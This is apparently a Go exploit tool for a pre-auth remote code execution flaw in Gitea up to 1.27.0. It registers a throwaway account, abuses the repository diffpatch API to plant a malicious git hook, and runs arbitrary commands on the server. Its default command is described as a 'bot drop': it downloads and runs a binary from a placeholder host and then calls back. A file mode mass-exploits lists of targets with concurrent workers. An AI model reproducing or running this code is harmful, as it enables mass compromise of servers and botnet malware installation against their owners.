// CVE-2026-60004 — Gitea <= 1.27.0 Pre-Auth Remote Code Execution (Go port)

package main

import (
	"bytes"
	"crypto/sha1"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

// default bot drop command (tag "gitea")
const defaultCmd = `cd /tmp; (curl -sLo q http://ipipip/x86_64 || wget -qO q http://ipipip/x86_64); chmod +x q; ./q gitea; curl -s http://ipipip:8899/GITOK`

type client struct {
	base   string
	http   *http.Client
	user   string
	pw     string
	repo   string
	branch string
	quiet  bool
}

func randStr(n int) string {
	const al = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = al[rand.Intn(len(al))]
	}
	return string(b)
}

func blobSHA1(data []byte) string {
	h := sha1.New()
	fmt.Fprintf(h, "blob %d\x00", len(data))
	h.Write(data)
	return fmt.Sprintf("%x", h.Sum(nil))
}

func basicAuth(u, p string) string {
	return base64.StdEncoding.EncodeToString([]byte(u + ":" + p))
}

// buildHookPayload generates the post-index-change hook that runs cmd and stores
// its output in the origin repo on a branch named "rce-proof".
func buildHookPayload(cmd string) string {
	hook := `#!/bin/sh
git_dir=$(git rev-parse --absolute-git-dir) || exit 1
origin_objects=$(sed -n "1p" "$git_dir/objects/info/alternates") || exit 2
case "$origin_objects" in
 /*) ;;
 *) origin_objects="$git_dir/objects/$origin_objects" ;;
esac
origin_git=${origin_objects%/objects}
[ "$origin_git" != "$origin_objects" ] || exit 3
output_blob=$(CMD_PLACEHOLDER 2>&1 | git --git-dir="$origin_git" hash-object -w --stdin) || exit 4
tree=$(printf "100644 blob %s\tproof\n" "$output_blob" | git --git-dir="$origin_git" mktree) || exit 5
commit=$(printf "rce proof\n" | GIT_AUTHOR_NAME=poc GIT_AUTHOR_EMAIL=poc@x GIT_COMMITTER_NAME=poc GIT_COMMITTER_EMAIL=poc@x git --git-dir="$origin_git" commit-tree "$tree") || exit 6
git --git-dir="$origin_git" update-ref refs/heads/rce-proof "$commit" || exit 7
exit 0
`
	return strings.ReplaceAll(hook, "CMD_PLACEHOLDER", cmd)
}

// buildDiffpatch builds the malicious patch planting hooks/post-index-change.
func buildDiffpatch(hook string) string {
	sha := blobSHA1([]byte(hook))
	lines := strings.Split(strings.TrimRight(hook, "\n"), "\n")
	var b strings.Builder
	b.WriteString("diff --git a/hooks/post-index-change b/hooks/post-index-change\n")
	b.WriteString("new file mode 100755\n")
	b.WriteString("index 0000000000000000000000000000000000000000.." + sha + "\n")
	b.WriteString("--- /dev/null\n")
	b.WriteString("+++ b/hooks/post-index-change\n")
	fmt.Fprintf(&b, "@@ -0,0 +1,%d @@\n", len(lines))
	for _, ln := range lines {
		b.WriteString("+" + ln + "\n")
	}
	return b.String()
}

func (c *client) do(method, path string, body []byte, auth bool, ctype string) (int, []byte) {
	req, _ := http.NewRequest(method, c.base+path, bytes.NewReader(body))
	req.Header.Set("User-Agent", userAgent)
	if auth {
		req.Header.Set("Authorization", "Basic "+basicAuth(c.user, c.pw))
	}
	if ctype != "" {
		req.Header.Set("Content-Type", ctype)
	}
	resp, err := c.http.Do(req)
	if err != nil {
		return 0, []byte(err.Error())
	}
	defer resp.Body.Close()
	out, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	return resp.StatusCode, out
}

func (c *client) register(username, password, email string) bool {
	st, body := c.do("GET", "/user/sign_up", nil, false, "")
	csrf := ""
	if st == 200 {
		s := string(body)
		if i := strings.Index(s, `name="_csrf"`); i >= 0 {
			seg := s[i:]
			if v := strings.Index(seg, `value="`); v >= 0 {
				seg = seg[v+7:]
				if e := strings.Index(seg, `"`); e > 0 {
					csrf = seg[:e]
				}
			}
		}
	}
	form := url.Values{}
	form.Set("user_name", username)
	form.Set("email", email)
	form.Set("password", password)
	form.Set("retype", password)
	d := form.Encode()
	if csrf != "" {
		d = "_csrf=" + url.QueryEscape(csrf) + "&" + d
	}
	st, _ = c.do("POST", "/user/sign_up", []byte(d), false, "application/x-www-form-urlencoded")
	if st == 200 || st == 302 || st == 303 {
		c.user, c.pw = username, password
		return true
	}
	return false
}

func (c *client) createRepo(name string) bool {
	body, _ := json.Marshal(map[string]interface{}{
		"name": name, "private": true, "auto_init": true, "default_branch": c.branch,
	})
	st, _ := c.do("POST", "/api/v1/user/repos", body, true, "application/json")
	if st == 201 || st == 409 {
		c.repo = name
		return true
	}
	return false
}

func (c *client) branchSHA() string {
	st, body := c.do("GET", fmt.Sprintf("/api/v1/repos/%s/%s/branches/%s", c.user, c.repo, c.branch), nil, true, "")
	if st != 200 {
		return ""
	}
	var d struct {
		Commit struct {
			ID string `json:"id"`
		} `json:"commit"`
	}
	json.Unmarshal(body, &d)
	return d.Commit.ID
}

func (c *client) sendDiffpatch(diff, msg, sha string) string {
	jm := map[string]interface{}{"content": diff, "message": msg, "branch": c.branch}
	if sha != "" {
		jm["sha"] = sha
	}
	body, _ := json.Marshal(jm)
	st, out := c.do("POST", fmt.Sprintf("/api/v1/repos/%s/%s/diffpatch", c.user, c.repo), body, true, "application/json")
	if st == 201 {
		var d struct {
			Commit struct {
				SHA string `json:"sha"`
			} `json:"commit"`
		}
		json.Unmarshal(out, &d)
		return d.Commit.SHA
	}
	return ""
}

func (c *client) run(base, cmd string, count int) bool {
	c.base = strings.TrimRight(base, "/")
	c.branch = "main"
	name := "u" + randStr(8)
	pass := randStr(12) + "Aa1!"
	if !c.register(name, pass, name+"@x.local") {
		fmt.Printf("[-] %s register failed\n", base)
		return false
	}
	if !c.createRepo("r" + randStr(6)) {
		fmt.Printf("[-] %s repo create failed\n", base)
		return false
	}
	sha := c.branchSHA()
	diff := buildDiffpatch(buildHookPayload(cmd))
	for i := 1; i <= count; i++ {
		ns := c.sendDiffpatch(diff, fmt.Sprintf("apply-%d", i), sha)
		if ns == "" {
			return i > 1
		}
		sha = ns
		time.Sleep(time.Second)
	}
	fmt.Printf("[+] %s exploited\n", base)
	return true
}

func main() {
	urlFlag := flag.String("url", "", "Gitea base URL e.g. http://host:3000")
	cmd := flag.String("cmd", defaultCmd, "command to run on target")
	count := flag.Int("count", 3, "diffpatch sends")
	file := flag.String("file", "", "file with base URLs (one per line)")
	workers := flag.Int("w", 15, "workers for file mode")
	flag.Parse()

	tr := &http.Transport{MaxIdleConns: 100, DisableKeepAlives: true}
	h := &http.Client{Timeout: 25 * time.Second, Transport: tr, CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}

	if *file != "" {
		data, err := os.ReadFile(*file)
		if err != nil {
			fmt.Println("read:", err)
			return
		}
		lines := strings.Split(strings.TrimSpace(string(data)), "\n")
		sem := make(chan struct{}, *workers)
		done := make(chan struct{}, len(lines))
		for _, ln := range lines {
			ln = strings.TrimSpace(ln)
			if ln == "" {
				continue
			}
			sem <- struct{}{}
			go func(u string) {
				defer func() { <-sem; done <- struct{}{} }()
				c := &client{http: h}
				c.run(u, *cmd, *count)
			}(ln)
		}
		for range lines {
			<-done
		}
		return
	}
	if *urlFlag == "" {
		fmt.Println("usage: gitea -url http://host:3000 [-cmd ...] | -file targets.txt -w 15")
		return
	}
	c := &client{http: h}
	c.run(*urlFlag, *cmd, *count)
}
